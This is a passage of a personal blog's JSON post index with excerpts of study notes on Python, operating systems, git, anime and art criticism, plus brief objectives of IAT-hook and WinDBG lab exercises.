System","slug":"Operating-System","permalink":"https://hejueyun.github.io/categories/Operating-System/"},{"name":"Linux","slug":"Operating-System/Linux","permalink":"https://hejueyun.github.io/categories/Operating-System/Linux/"}],"tags":[]},{"title":"《任航-没有救赎的躯体》笔记","date":"2020-03-26T10:35:49.000Z","path":"posts/9af2afb1/","slug":"《任航-没有救赎的躯体》笔记","permalink":"https://hejueyun.github.io/posts/9af2afb1/","excerpt":"选自Ren HangBodies Without Redemption 早期 Ren capitalised on a ‘low class’ approach in his early photography. Dressed in cheap bras, fish net stockings, dyed hair, and bloody red lips, his female prototypes could have just as easily been found in Yang Yong’s early works on Shenzhen prostitutes, such as his series ‘Fancy in Tunnel’ (2001–2003) (Yang 2014). However, compared to Yang’s seriousness in questioning the lost identity of these female migrants when facing rapid urbanisation in south China, Ren’s ‘low class’ seemed indifferent 拍裸体 ‘We were born nude… I just photograph things in their most natural condition,’ The red lips and nails betray the ‘naturalness’ that Ren claimed, and hint at a formula common in fashion photography, reflecting his advertising background. (任航在中传学的广告) 私摄影 The trend of casually photographingthe everyday life of friends started with the emergence of the so-called ‘private photography’ (私摄影) movement in China at the turn of the millennium. They decided to capture the spontaneity of fleeting moments all around them, which they used to express their indifference to the rest of the world. 拍摄方式 Ren’s snapshots were carefully choreographed and framed. **Mostly positioned in the middle of the image, the bodies in his photographs were always shown in uncanny twists and bends. ** These naked young men and women looked as if they were playing hide-and-seek by climbing on trees. Pinching the skin of a neck or penis seemed childishly funny. Yet the flash from the point-and-shoot camera ** flattened these young faces ** and cast a layer of stark pallor on them. His stark flashed images perfectly blended ‘private photography’ with more staged fashion photography 摄影书出版 Ren Hang caught the wave of this rising hipness. While traditional publishing venues shut their doors, independent publishers at home and abroad welcomed his new brand of talent. Self-publishing enabled him to have a specific public, more control over the printing process, and complete freedom in the selection of content.","categories":[],"tags":[{"name":"essay","slug":"essay","permalink":"https://hejueyun.github.io/tags/essay/"}]},{"title":"日本动漫艺术概论笔记","date":"2020-03-15T14:31:04.000Z","path":"posts/6b3eaba7/","slug":"日本动漫艺术概论笔记","permalink":"https://hejueyun.github.io/posts/6b3eaba7/","excerpt":"1. 引言 动漫定义 日本动画 anime 日本漫画 manga 卡通 漫画和动画电影 cartoon &#x3D; animated cartoon 即“动起来的漫画” 同人 原指非官方的，民间兴趣小组所完成的作品 1.1. 名词解释 企画 日本动画提出基本构思的人 动画公司的老板或制作人发掘漫画游戏等并购买版权：原作 监督自行撰写草案交由老板商议、老板再找投资商：原案 监督 相当于导演 作画监督、美术监督、音响监督、摄影监督 演出 指副监督（助监督） 人物／机械设定 指对人物／机械的设计工作 设计要工整单一不能过于繁索 要求画出人物的三面图以及相对高度、人物表情，以便原画师和动画师能够在绘制时保持一致 原画 原画是原画师把分镜表上的运动物体细致化的过程，也就是只绘制关键帧（关键帧的动作连续是由动画师完成的） 动画 动画在制作流程里是指，按照分镜表里的时间，确定绘制的格数然后连接原画间动作的工作 色指定（色彩设定） 指定上色时某个部位的颜色 仕上 上色 声优 配音演员 2. 动画的基本艺术特征 早期动画 现代动画 作为电影艺术的分支 最早：法国人埃米尔·雷诺 赛路路 逐格拍摄法 2.1. 艺术手段 抽象 变形 拼贴 2.1.1. 抽象 是漫画的根本属性 与写实性绘画相区别 漫画家的职责即是把抽象这项天赋精致化、艺术化","categories":[],"tags":[{"name":"essay","slug":"essay","permalink":"https://hejueyun.github.io/tags/essay/"}]},{"title":"Python厨书笔记-9","date":"2020-03-11T20:57:01.000Z","path":"posts/740b7114/","slug":"python厨书笔记-9","permalink":"https://hejueyun.github.io/posts/740b7114/","excerpt":"1. 并发编程2. 并发与并行 如果某个系统支持两个或者多个动作（Action）同时存在，那么这个系统就是一个并发系统。如果某个系统支持两个或者多个动作同时执行，那么这个系统就是一个并行系统。并发系统与并行系统这两个定义之间的关键差异在于“存在”这个词。 在并发程序中可以同时拥有两个或者多个线程。这意味着，如果程序在单核处理器上运行，那么这两个线程将交替地换入或者换出内存。这些线程是同时“存在”的——每个线程都处于执行过程中的某个状态。如果程序能够并行执行，那么就一定是运行在多核处理器上。此时，程序中的每个线程都将分配到一个独立的处理器核上，因此可以同时运行。 我相信你已经能够得出结论——“并行”概念是“并发”概念的一个子集。也就是说，你可以编写一个拥有多个线程或者进程的并发程序，但如果没有多核处理器来执行这个程序，那么就不能以并行方式来运行代码。因此，凡是在求解单个问题时涉及多个执行流程的编程模式或者执行行为，都属于并发编程的范畴。 狭义的并发大概是单线程 3. 全局解释器锁(GIL) 定义 A global interpreter lock (GIL) is a mechanism used in computer-language interpreters to synchronize the execution of threads so that only one native thread can execute at a time An interpreter that uses GIL always allows exactly one thread to execute at a time, even if run on a multi-core processor. Some popular interpreters that have GIL are CPython and Ruby MRI. A global interpreter lock (GIL) is a mutual-exclusion lock held by a programming language interpreter thread to avoid sharing code that is not thread-safe with other threads.** In implementations with a GIL, there is always one GIL for each interpreter process.** Applications running on implementations with a GIL can be designed to use separate processes to achieve full parallelism, as each process has its own interpreter and in turn has its own GIL. Otherwise, the GIL can be a significant barrier to parallelism. Wikipedia contributors. (2019, December 30). Global interpreter lock. In Wikipedia, The Free Encyclopedia. Retrieved 13:27, March 11, 2020, from https://en.wikipedia.org/w/index.php?title=Global_interpreter_lock&amp;oldid=933155133","categories":[{"name":"Program Language","slug":"Program-Language","permalink":"https://hejueyun.github.io/categories/Program-Language/"},{"name":"Python","slug":"Program-Language/Python","permalink":"https://hejueyun.github.io/categories/Program-Language/Python/"},{"name":"Cookbook","slug":"Program-Language/Python/Cookbook","permalink":"https://hejueyun.github.io/categories/Program-Language/Python/Cookbook/"}],"tags":[{"name":"Cookbook","slug":"Cookbook","permalink":"https://hejueyun.github.io/tags/Cookbook/"}]},{"title":"视觉艺术笔记","date":"2020-03-08T17:58:58.000Z","path":"posts/c68f360a/","slug":"视觉艺术笔记","permalink":"https://hejueyun.github.io/posts/c68f360a/","excerpt":"1. 绪论 艺术作品的价值 取决于制作它的艺术家在视觉形式中表现他的观念或情愫之能力 视觉过程 线条 色彩 材质 2. 线条 当艺术家在画下一条线时，他就是在提供一条视觉径，促使观赏者的眼睛顺着它游历 …波状图案时，经历了一系列水平与垂直波状的动。由于这些运动的规则性建立了一种视觉形式，接着们很快地就能意识到这些线条的特质。如果这个形式是限继续的，我们的眼睛就会疲倦，并且对这些线条失去趣，我们就会把这些线条说成是单调的 相对之下，因此我们不妨用「快」与「慢」分别形容身上及鱼尾上的线条。所以形容一条线的特质，都是依我们的眼睛看到一条线时所经过的动作得来的 不仅是因为各式的线条驱使眼睛产生复杂的动作，因为这些线条，让我们从记忆中联想起在类似情形里对他感情或情绪的反应。所以在《早春图》里充分感受画中严寒萧条的景色，因为郭熙大多使用短促的、锐的、巨齿状的曲线，就像冰的结晶一样锐利 2.1. 线条的特质 类型 垂直线 上下笔直移动的线条，艺术家用他来表现尊贵、严肃和有力的 水平线 和地平面平行的线条，他可以表现静止，让人感觉宁静、平和、安稳的感觉 对角线 一条倾斜的线，艺术家用它来表现显著的动作或不安的紧绷感等 曲线 逐渐改变方向的弯曲线条，他可以呈现优美和流动的动态感 曲折线 直线折曲而成锐角的线，它有急速改变方向的特性，使人联想到困惑的激动及冲出的力量感 2.2. 描绘方式 线条描绘法﹝line drawing﹞ 轮廓描绘法﹝contour drawing﹞ 姿态描绘法﹝gesture drawing﹞ 人类描绘一件物体时，刚开始会暂时忽视物体的细节部分，而专注那些最基本的方面，因此会先画下暗示该物体性质的主要线条。将不同的线条画在一起的描绘法，很适合描画动态物体的动感、韵律、运动姿态 2.3. 线条的作用 凸出主体 此外，他又进一步用建筑物垂直形式的背景强化基督在画中的重要性。这些建筑物上的许多列柱与台阶与基督身形的直立性质相互呼应。其他画中所有围绕着基督的人体都是以各种扭曲形状呈现；没有基督所特有的直立性状。 示出方向 譬如当我们看到一根指示方向的手指时，我们的眼睛会从手指尖端移向它所指的物体，因而形成一条无形的线条。或者当我们随着某一个人凝视而及于他所留意的物体时，也会造成一条类似的线条","categories":[],"tags":[{"name":"essay","slug":"essay","permalink":"https://hejueyun.github.io/tags/essay/"}]},{"title":"vscode快捷键","date":"2020-03-07T12:44:08.000Z","path":"posts/ea22a33a/","slug":"vscode快捷键","permalink":"https://hejueyun.github.io/posts/ea22a33a/","excerpt":"1. 命令行使用已经打开的窗口来打开文件 code -r复用 打开文件，然后滚动到文件中某个特定的行和列 code -g &lt;file:line[:character]&gt;","categories":[],"tags":[{"name":"shortcut","slug":"shortcut","permalink":"https://hejueyun.github.io/tags/shortcut/"}]},{"title":"Python厨书笔记-8","date":"2020-02-08T18:10:51.000Z","path":"posts/30c4182/","slug":"python厨书笔记-8","permalink":"https://hejueyun.github.io/posts/30c4182/","excerpt":"1. 类与对象2. 对象的字符串显示 __repr__() 返回一个实例的代码表示形式 内置的repr()函数返回这个字符串，跟我们使用交互式解释器显示的值是一样的 __str__() 将实例转换为一个字符串 使用 str() 或 print() 函数会输出这个字符串 如果 __str__() 没有被定义，那么就会使用 __repr__() 来代替输出 3. 自定义字符串的格式化 format()重构 123456789101112131415161718192021222324_formats = &#123; &#x27;ymd&#x27; : &#x27;&#123;d.year&#125;-&#123;d.month&#125;-&#123;d.day&#125;&#x27;, &#x27;mdy&#x27; : &#x27;&#123;d.month&#125;/&#123;d.day&#125;/&#123;d.year&#125;&#x27;, &#x27;dmy&#x27; : &#x27;&#123;d.day&#125;/&#123;d.month&#125;/&#123;d.year&#125;&#x27; &#125;class Date: def __init__(self, year, month, day): self.year = year self.month = month self.day = day def __format__(self, code): if code == &#x27;&#x27;: code = &#x27;ymd&#x27; fmt = _formats[code] return fmt.format(d=self)&gt;&gt;&gt; d = Date(2012, 12, 21)&gt;&gt;&gt; format(d)&#x27;2012-12-21&#x27;&gt;&gt;&gt; format(d, &#x27;mdy&#x27;)&#x27;12/21/2012&#x27;&gt;&gt;&gt; &#x27;The date is &#123;:ymd&#125;&#x27;.format(d)&#x27;The date is 2012-12-21&#x27; 关于冒号 {字段名!转换字段:格式说明符}1234print(&#x27;&#123;0:&#123;1&#125;&#125;&#x27;.format(3.14159, &#x27;. 4f&#x27;))&quot;&quot;&quot;3.1416&quot;&quot;&quot; 4. 编写上下文管理器 主要原理 代码会放到 with 语句块中执行。 当出现 with 语句的时候，对象的 enter() 方法被触发， 它返回的值(如果有的话)会被赋值给 as 声明的变量。然后，with 语句块里面的代码开始执行。 最后，exit() 方法被触发进行清理工作。 5. __slots__ 当你定义 slots 后，Python就会为实例使用一种更加紧凑的内部表示。 实例通过一个很小的固定大小的数组来构建，而不是为每个实例定义一个字典，这跟元组或列表很类似。 在 slots 中列出的属性名在内部被映射到这个数组的指定小标上。 使用slots一个不好的地方就是我们不能再给实例添加新的属性了，只能使用在 slots 中定义的那些属性名 123456class Date: __slots__ = [&#x27;year&#x27;, &#x27;month&#x27;, &gt; &#x27;day&#x27;] def __init__(self, year, month, &gt; day): self.year = year self.month = month self.day = day","categories":[{"name":"Program Language","slug":"Program-Language","permalink":"https://hejueyun.github.io/categories/Program-Language/"},{"name":"Python","slug":"Program-Language/Python","permalink":"https://hejueyun.github.io/categories/Program-Language/Python/"},{"name":"Cookbook","slug":"Program-Language/Python/Cookbook","permalink":"https://hejueyun.github.io/categories/Program-Language/Python/Cookbook/"}],"tags":[{"name":"Cookbook","slug":"Cookbook","permalink":"https://hejueyun.github.io/tags/Cookbook/"}]},{"title":"leetcode-1","date":"2020-02-02T14:03:15.000Z","path":"posts/ad192219/","slug":"leetcode笔记-1","permalink":"https://hejueyun.github.io/posts/ad192219/","excerpt":"1. 1. 两数之和 一遍哈希表：O(n) 一边更新哈希表一边查询 ps：如果用数组做，还要填一遍零","categories":[{"name":"Algorithm","slug":"Algorithm","permalink":"https://hejueyun.github.io/categories/Algorithm/"},{"name":"Leetcode","slug":"Algorithm/Leetcode","permalink":"https://hejueyun.github.io/categories/Algorithm/Leetcode/"}],"tags":[]},{"title":"git笔记","date":"2020-01-27T14:08:58.000Z","path":"posts/d9283bc6/","slug":"git笔记","permalink":"https://hejueyun.github.io/posts/d9283bc6/","excerpt":"1. 历史 本地版本控制系 集中化版本控制 分布式版本控制","categories":[],"tags":[{"name":"git","slug":"git","permalink":"https://hejueyun.github.io/tags/git/"}]},{"title":"Make&&Valgrind","date":"2020-01-26T00:16:54.000Z","path":"posts/e24b25c8/","slug":"Make-Valgrind","permalink":"https://hejueyun.github.io/posts/e24b25c8/","excerpt":"1. Make2. 隐式声明123456➜ dumpc make ex1cc ex1.c -o ex1ex1.c: In function ‘main’:ex1.c:4:5: warning: implicit declaration of function ‘puts’ [-Wimplicit-function-declaration] puts(&quot;Hello world.&quot;); ^~~~","categories":[{"name":"Program Language","slug":"Program-Language","permalink":"https://hejueyun.github.io/categories/Program-Language/"},{"name":"C","slug":"Program-Language/C","permalink":"https://hejueyun.github.io/categories/Program-Language/C/"},{"name":"Basic","slug":"Program-Language/C/Basic","permalink":"https://hejueyun.github.io/categories/Program-Language/C/Basic/"}],"tags":[]},{"title":"Python入门-2","date":"2020-01-24T14:05:49.000Z","path":"posts/1da961da/","slug":"python入门-2","permalink":"https://hejueyun.github.io/posts/1da961da/","excerpt":"1. 模块 如果你从Python解释器退出并再次进入，之前的定义（函数和变量）都会丢失。因此，如果你想编写一个稍长些的程序，最好使用文本编辑器为解释器准备输入并将该文件作为输入运行。这被称作编写 脚本 。","categories":[{"name":"Program Language","slug":"Program-Language","permalink":"https://hejueyun.github.io/categories/Program-Language/"},{"name":"Python","slug":"Program-Language/Python","permalink":"https://hejueyun.github.io/categories/Program-Language/Python/"},{"name":"Basic","slug":"Program-Language/Python/Basic","permalink":"https://hejueyun.github.io/categories/Program-Language/Python/Basic/"}],"tags":[]},{"title":"Python入门-1","date":"2020-01-24T14:05:42.000Z","path":"posts/84a03060/","slug":"python入门-1","permalink":"https://hejueyun.github.io/posts/84a03060/","excerpt":"1. Python解释器2. 调用解释器The Python interpreter is usually installed as /usr/local/bin/python3.7 on those machines where it is available; putting /usr/local/bin in your Unix shell’s search path makes it possible to start it by typing the command: 1python3.7 在主提示符中输入文件结束字符（在 Unix 系统中是 Control-D，Windows 系统中是 Control-Z）就退出解释器并返回退出状态为0。如果这样不管用，你还可以写这个命令退出：quit()。 有些 Python 模块也可以作为脚本使用。可以这样输入：python -m module [arg] ...，这会执行 module 的源文件，就跟你在命令行把路径写全了一样。 在终端（tty）输入并执行指令时，我们说解释器是运行在 交互模式（interactive mode）。在这种模式中，它会显示 主提示符（primary prompt），提示输入下一条指令，通常用三个大于号（&gt;&gt;&gt;）表示；连续输入行的时候，它会显示 次要提示符，默认是三个点（...）","categories":[{"name":"Program Language","slug":"Program-Language","permalink":"https://hejueyun.github.io/categories/Program-Language/"},{"name":"Python","slug":"Program-Language/Python","permalink":"https://hejueyun.github.io/categories/Program-Language/Python/"},{"name":"Basic","slug":"Program-Language/Python/Basic","permalink":"https://hejueyun.github.io/categories/Program-Language/Python/Basic/"}],"tags":[]},{"title":"Python厨书笔记-7","date":"2020-01-24T13:40:31.000Z","path":"posts/93b35c13/","slug":"python厨书笔记-7","permalink":"https://hejueyun.github.io/posts/93b35c13/","excerpt":"1. 函数","categories":[{"name":"Program Language","slug":"Program-Language","permalink":"https://hejueyun.github.io/categories/Program-Language/"},{"name":"Python","slug":"Program-Language/Python","permalink":"https://hejueyun.github.io/categories/Program-Language/Python/"},{"name":"Cookbook","slug":"Program-Language/Python/Cookbook","permalink":"https://hejueyun.github.io/categories/Program-Language/Python/Cookbook/"}],"tags":[{"name":"Cookbook","slug":"Cookbook","permalink":"https://hejueyun.github.io/tags/Cookbook/"}]},{"title":"Python方法：实例、类、静态和抽象","date":"2020-01-23T13:58:46.000Z","path":"posts/bce79809/","slug":"实例方法、类方法和静态方法","permalink":"https://hejueyun.github.io/posts/bce79809/","excerpt":"1. Overview1234567891011class MyClass: def method(self): return &#x27;instance method called&#x27;, self @classmethod def classmethod(cls): return &#x27;class method called&#x27;, cls @staticmethod def staticmethod(): return &#x27;static method called&#x27;","categories":[{"name":"Program Language","slug":"Program-Language","permalink":"https://hejueyun.github.io/categories/Program-Language/"},{"name":"Python","slug":"Program-Language/Python","permalink":"https://hejueyun.github.io/categories/Program-Language/Python/"},{"name":"Advanced","slug":"Program-Language/Python/Advanced","permalink":"https://hejueyun.github.io/categories/Program-Language/Python/Advanced/"}],"tags":[]},{"title":"Python属性与特性","date":"2020-01-22T15:10:31.000Z","path":"posts/9b7239d7/","slug":"属性与特性","permalink":"https://hejueyun.github.io/posts/9b7239d7/","excerpt":"1. 属性与特性 属性（property） 特性（attribute）","categories":[{"name":"Program Language","slug":"Program-Language","permalink":"https://hejueyun.github.io/categories/Program-Language/"},{"name":"Python","slug":"Program-Language/Python","permalink":"https://hejueyun.github.io/categories/Program-Language/Python/"},{"name":"Advanced","slug":"Program-Language/Python/Advanced","permalink":"https://hejueyun.github.io/categories/Program-Language/Python/Advanced/"}],"tags":[]},{"title":"脚本与模块","date":"2020-01-21T13:00:16.000Z","path":"posts/ad1feee7/","slug":"脚本与模块","permalink":"https://hejueyun.github.io/posts/ad1feee7/","excerpt":"1. 脚本 如果你从Python解释器退出并再次进入，之前的定义（函数和变量）都会丢失。因此，如果你想编写一个稍长些的程序，最好使用文本编辑器为解释器准备输入并将该文件作为输入运行。这被称作编写 脚本 脚本（Script）是一种批处理文件的延伸，是一种纯文本保存的程序，一般来说的计算机脚本程序是确定的一系列控制计算机进行运算操作动作的组合，在其中可以实现一定的逻辑分支等","categories":[{"name":"Program Language","slug":"Program-Language","permalink":"https://hejueyun.github.io/categories/Program-Language/"},{"name":"Python","slug":"Program-Language/Python","permalink":"https://hejueyun.github.io/categories/Program-Language/Python/"},{"name":"Basic","slug":"Program-Language/Python/Basic","permalink":"https://hejueyun.github.io/categories/Program-Language/Python/Basic/"}],"tags":[]},{"title":"pep8编码风格笔记","date":"2020-01-19T18:32:05.000Z","path":"posts/3c2b83f3/","slug":"pep8编码风格笔记","permalink":"https://hejueyun.github.io/posts/3c2b83f3/","excerpt":"只挑重要且难以auto-pep8的","categories":[{"name":"Program Language","slug":"Program-Language","permalink":"https://hejueyun.github.io/categories/Program-Language/"},{"name":"Python","slug":"Program-Language/Python","permalink":"https://hejueyun.github.io/categories/Program-Language/Python/"},{"name":"Basic","slug":"Program-Language/Python/Basic","permalink":"https://hejueyun.github.io/categories/Program-Language/Python/Basic/"}],"tags":[]},{"title":"python源码分析-1","date":"2020-01-19T18:15:46.000Z","path":"posts/370281b5/","slug":"python源码分析-1","permalink":"https://hejueyun.github.io/posts/370281b5/","excerpt":"待填坑","categories":[{"name":"Program Language","slug":"Program-Language","permalink":"https://hejueyun.github.io/categories/Program-Language/"},{"name":"Python","slug":"Program-Language/Python","permalink":"https://hejueyun.github.io/categories/Program-Language/Python/"},{"name":"Sourcecode","slug":"Program-Language/Python/Sourcecode","permalink":"https://hejueyun.github.io/categories/Program-Language/Python/Sourcecode/"}],"tags":[{"name":"Sourcecode","slug":"Sourcecode","permalink":"https://hejueyun.github.io/tags/Sourcecode/"}]},{"title":"Python函数式编程","date":"2020-01-19T16:13:13.000Z","path":"posts/f1fcd5aa/","slug":"函数式编程","permalink":"https://hejueyun.github.io/posts/f1fcd5aa/","excerpt":"1. 函数式编程 函数式编程（英语：functional programming）或称函数程序设计、泛函编程，是一种编程范式，它将电脑运算视为函数运算，并且避免使用程序状态以及易变对象。其中，λ演算（lambda calculus）为该语言最重要的基础 比起指令式编程，函数式编程更加强调程序执行的结果而非执行的过程，倡导利用若干简单的执行单元让计算结果不断渐进，逐层推导复杂的运算，而不是设计一个复杂的执行过程 函数式编程就是一种抽象程度很高的编程范式，纯粹的函数式编程语言编写的函数没有变量，因此，任意一个函数，只要输入是确定的，输出就是确定的，这种纯函数我们称之为没有副作用。而允许使用变量的程序设计语言，由于函数内部的变量状态不确定，同样的输入，可能得到不同的输出，因此，这种函数是有副作用的。 函数式编程的一个特点就是，允许把函数本身作为参数传入另一个函数，还允许返回一个函数","categories":[{"name":"Program Language","slug":"Program-Language","permalink":"https://hejueyun.github.io/categories/Program-Language/"},{"name":"Python","slug":"Program-Language/Python","permalink":"https://hejueyun.github.io/categories/Program-Language/Python/"},{"name":"Advanced","slug":"Program-Language/Python/Advanced","permalink":"https://hejueyun.github.io/categories/Program-Language/Python/Advanced/"}],"tags":[]},{"title":"python垃圾回收","date":"2020-01-17T16:53:05.000Z","path":"posts/aec383d/","slug":"python垃圾回收","permalink":"https://hejueyun.github.io/posts/aec383d/","excerpt":"1. 概述 Python’s memory allocation and deallocation method is automatic. The user does not have to preallocate or deallocate memory similar to using dynamic memory allocation in languages such as C or C++.","categories":[{"name":"Program Language","slug":"Program-Language","permalink":"https://hejueyun.github.io/categories/Program-Language/"},{"name":"Python","slug":"Program-Language/Python","permalink":"https://hejueyun.github.io/categories/Program-Language/Python/"},{"name":"Advanced","slug":"Program-Language/Python/Advanced","permalink":"https://hejueyun.github.io/categories/Program-Language/Python/Advanced/"}],"tags":[]},{"title":"Python厨书笔记-6","date":"2020-01-17T15:23:16.000Z","path":"posts/e4b46c85/","slug":"python厨书笔记-6","permalink":"https://hejueyun.github.io/posts/e4b46c85/","excerpt":"1. 文件IO","categories":[{"name":"Program Language","slug":"Program-Language","permalink":"https://hejueyun.github.io/categories/Program-Language/"},{"name":"Python","slug":"Program-Language/Python","permalink":"https://hejueyun.github.io/categories/Program-Language/Python/"},{"name":"Cookbook","slug":"Program-Language/Python/Cookbook","permalink":"https://hejueyun.github.io/categories/Program-Language/Python/Cookbook/"}],"tags":[{"name":"Cookbook","slug":"Cookbook","permalink":"https://hejueyun.github.io/tags/Cookbook/"}]},{"title":"Python厨书笔记-5","date":"2020-01-15T23:47:09.000Z","path":"posts/7dbd3d3f/","slug":"python厨书笔记-5","permalink":"https://hejueyun.github.io/posts/7dbd3d3f/","excerpt":"1. 迭代器与生成器可迭代特性意味着它不会立马读取所有序列","categories":[{"name":"Program Language","slug":"Program-Language","permalink":"https://hejueyun.github.io/categories/Program-Language/"},{"name":"Python","slug":"Program-Language/Python","permalink":"https://hejueyun.github.io/categories/Program-Language/Python/"},{"name":"Cookbook","slug":"Program-Language/Python/Cookbook","permalink":"https://hejueyun.github.io/categories/Program-Language/Python/Cookbook/"}],"tags":[{"name":"Cookbook","slug":"Cookbook","permalink":"https://hejueyun.github.io/tags/Cookbook/"}]},{"title":"IATHook注入与劫持实验","date":"2020-01-12T12:15:26.000Z","path":"posts/fab03ab4/","slug":"IATHook注入与劫持实验","permalink":"https://hejueyun.github.io/posts/fab03ab4/","excerpt":"1. 实验目的 了解Hook技术的基本原理 利用IATHook篡改notepad输入内容（WriteFile函数）","categories":[{"name":"Security","slug":"Security","permalink":"https://hejueyun.github.io/categories/Security/"},{"name":"Software Security","slug":"Security/Software-Security","permalink":"https://hejueyun.github.io/categories/Security/Software-Security/"}],"tags":[{"name":"sec","slug":"sec","permalink":"https://hejueyun.github.io/tags/sec/"}]},{"title":"实验:四元式编译器实现","date":"2020-01-10T13:17:26.000Z","path":"posts/996f08b/","slug":"四元式编译器实现","permalink":"https://hejueyun.github.io/posts/996f08b/","excerpt":"1. 实验目的 实现一个支持对四则运算与条件转移四元式翻译的简易编译器","categories":[{"name":"Compiler Construction","slug":"Compiler-Construction","permalink":"https://hejueyun.github.io/categories/Compiler-Construction/"},{"name":"Lab","slug":"Compiler-Construction/Lab","permalink":"https://hejueyun.github.io/categories/Compiler-Construction/Lab/"}],"tags":[{"name":"Lab","slug":"Lab","permalink":"https://hejueyun.github.io/tags/Lab/"}]},{"title":"操作系统备忘录-硬盘存储器与操作系统接口","date":"2020-01-07T21:44:59.000Z","path":"posts/8e012db0/","slug":"操作系统备忘录-硬盘存储器与操作系统接口","permalink":"https://hejueyun.github.io/posts/8e012db0/","excerpt":"1. 外存的组织方式 连续 链接 隐式链接 显式链接 把链接指针统一存放在一张表中 文件分配表（File Allocation Table, FAT） 在链表结构的基础上，把每一个物理块当中的链表指针抽取出来，单独组成一个表格 FAT16 FAT表16位 最大容量：216*64(每簇的扇区数)*512&#x3D;2048MB 簇内碎片大 NTFS NTFS（New Technology File System） 2. 文件存储空间的管理 空闲表法 系统为外存上的所有空闲区 建立一张空闲表 空闲链表法 空闲盘区链接在一起 3. 提高磁盘I&#x2F;O速度的途径 磁盘高速缓存(Disk Cache) 磁盘中盘块数据欲调入高速缓存，如缓存满， 需要将缓存中数据换出（LRU 及类似算法） 提前读(Read-Ahead) 延迟写 … 廉价磁盘冗余阵列 Redundant Array of Inexpensive Disk,RAID 用一台磁盘阵列控制器统一管理和控制一组磁盘驱动器，组成可靠快速的大容量磁盘系统","categories":[{"name":"Operating System","slug":"Operating-System","permalink":"https://hejueyun.github.io/categories/Operating-System/"},{"name":"Notes","slug":"Operating-System/Notes","permalink":"https://hejueyun.github.io/categories/Operating-System/Notes/"}],"tags":[{"name":"Notes","slug":"Notes","permalink":"https://hejueyun.github.io/tags/Notes/"}]},{"title":"操作系统备忘录-文件系统","date":"2020-01-07T21:03:40.000Z","path":"posts/a0118d24/","slug":"操作系统备忘录-文件系统","permalink":"https://hejueyun.github.io/posts/a0118d24/","excerpt":"1. 基本概念 数据项 最低级的数据组织形式 记录 一组相关数据项的集合 用于描述一个对象在某方面的属性 文件 文件在文件系统中是一个最大的数据单位，它描述了 一个对象集 分为有结构文件和无结构文件两种。 在有结构的文件中，文件由若干个相关记录组成；而无结构文件则被看成是一个字符流 属性：类型、 长度、物理位置、建立时间等 文件操作 打开 文件操作需检索文件目录以获得文件属性和外存位置， 为避免多次重复检索目录，引入打开操作。 所谓“打开”，是指系统将指名文件的属性(包括该文 件在外存上的物理位置)从外存拷贝到内存打开文件表的一个表目中，并将该表目的编号(或称为索引**)返回给用户。以后， 当用户再要求对该文件进行相应的操作 时，便可利用系统所返回的索引号向系统提出操作请求。系统这时便可直接利用该索引号到打开文件表中去查找**。 关闭 将进程打开文件表中的相应表项删除 2. 文件的逻辑结构物理结构 又称为文件的存储结构， 是指文件在外存上的存储组织形式。 逻辑结构 用户观点所看到的文件组织形式，与存储设备特性无关 逻辑结构类型","categories":[{"name":"Operating System","slug":"Operating-System","permalink":"https://hejueyun.github.io/categories/Operating-System/"},{"name":"Notes","slug":"Operating-System/Notes","permalink":"https://hejueyun.github.io/categories/Operating-System/Notes/"}],"tags":[{"name":"Notes","slug":"Notes","permalink":"https://hejueyun.github.io/tags/Notes/"}]},{"title":"操作系统备忘录-输入输出系统","date":"2020-01-07T12:57:00.000Z","path":"posts/bf45a43d/","slug":"输入输出系统","permalink":"https://hejueyun.github.io/posts/bf45a43d/","excerpt":"1. I&#x2F;O系统功能模型和接口功能 隐藏物理设备细节 与设备无关性 … 层次模型 用户层软件：API 设备独立性软件：命名、保护、缓冲、分配释放等 设备驱动程序：硬件相关 中断处理程序 例：用户进程从文件读取一个数据块 系统调用－－－设备独立软件 查找页面－－－－如果没有；调用设备驱动程序向硬件请求；驱动程序从磁盘读数据块－－－－磁盘操作完成；硬件产生中断－－－唤醒用户进程结束I&#x2F;O操作 2. I&#x2F;O 设备控制器设备控制器 为术语驱动程序给出单一的准确定义比较困难。 就最基本的意义而言，驱动程序是一个软件组件，可让操作系统和设备彼此通信。 例如，假设应用程序需要从设备中读取某些数据。 应用程序会调用由操作系统实现的函数，操作系统会调用由驱动程序实现的函数。 充当CPU与外设的接口，接受CPU的命令去控制设备工作 内部构成 与处理机的接口 与设备的接口 I&#x2F;O逻辑","categories":[{"name":"Operating System","slug":"Operating-System","permalink":"https://hejueyun.github.io/categories/Operating-System/"},{"name":"Notes","slug":"Operating-System/Notes","permalink":"https://hejueyun.github.io/categories/Operating-System/Notes/"}],"tags":[{"name":"Notes","slug":"Notes","permalink":"https://hejueyun.github.io/tags/Notes/"}]},{"title":"操作系统备忘录-进程管理","date":"2020-01-06T14:06:27.000Z","path":"posts/3ea1f1f0/","slug":"操作系统备忘录-进程管理","permalink":"https://hejueyun.github.io/posts/3ea1f1f0/","excerpt":"1. 基本概念2. 程序基本概念程序 指令或语句序列 程序的执行方式 顺序执行 程序各部分（程序段或指令）依次顺序执行。当前操作完成 后才能执行其后继操作 前驱图 并发执行 一组逻辑相互独立的程序或者程序段在执行过程中，其执行时间在客观上互相重叠","categories":[{"name":"Operating System","slug":"Operating-System","permalink":"https://hejueyun.github.io/categories/Operating-System/"},{"name":"Notes","slug":"Operating-System/Notes","permalink":"https://hejueyun.github.io/categories/Operating-System/Notes/"}],"tags":[{"name":"Notes","slug":"Notes","permalink":"https://hejueyun.github.io/tags/Notes/"}]},{"title":"winDBG实验","date":"2020-01-05T19:58:48.000Z","path":"posts/640ea310/","slug":"winDBG实验","permalink":"https://hejueyun.github.io/posts/640ea310/","excerpt":"1. 实验目的 熟悉WinDBG的使用和一些常用命令 利用WinDBG，使notepad.exe在文件-&gt;打开窗口时仍然能在文字编辑窗口&#96;输入 正常情况👇 2. 实验原理winDBG WinDbg is a multipurpose debugger for the Microsoft Windows computer operating system, distributed by Microsoft. Debugging is the process of finding and resolving errors in a system; in computing it also includes exploring the internal operation of software as a help to development. It can be used to debug user mode applications, device drivers, and the operating system itself in kernel mode. Wikipedia contributors. (2019, October 20). WinDbg. PDB Program database (PDB) is a proprietary file format (developed by Microsoft) for storing debugging information about a program (or, commonly, program modules such as a DLL or EXE). PDB files commonly have a .pdb extension. A PDB file is typically created from source files during compilation. It stores a list of all symbols in a module with their addresses and possibly the name of the file and the line on which the symbol was declared. When a program is debugged, the debugger loads debugging information from the PDB file and uses it to locate symbols or relate current execution state of a program source code. Microsoft Visual Studio uses PDB files as its primary file format for debugging information. Wikipedia contributors. (2019, October 15). Program database. 3. 